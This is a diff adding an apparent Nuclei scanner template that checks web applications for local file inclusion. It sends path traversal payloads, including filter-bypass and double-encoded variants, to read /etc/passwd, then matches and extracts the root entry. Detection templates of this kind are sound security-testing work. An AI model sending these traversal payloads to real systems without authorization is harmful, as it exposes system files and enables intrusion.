@@ -1,0 +1,40 @@
+id: lfi-sensitive-files
+
+info:
+  name: LFI Sensitive Files Disclosure
+  author: DAAKU
+  severity: high
+  description: Detects LFI by reading sensitive system files with signature verification
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?page=../../../../etc/passwd"
+      - "{{BaseURL}}/load?file=../../../../etc/passwd"
+      - "{{BaseURL}}/download?path=....//....//....//etc/passwd"
+      - "{{BaseURL}}/static/..%252f..%252f..%252fetc/passwd"
+      
+    headers:
+      User-Agent: "Mozilla/5.0 (LFI-Tester) Nuclei/3.0"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"  # Linux passwd file signature
+          - "daemon:.*:1:1:"
+          - "bin:.*:2:2:"
+          
+      - type: word
+        words:
+          - "/bin/bash"
+          - "/bin/sh"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:.*"
+        group: 0
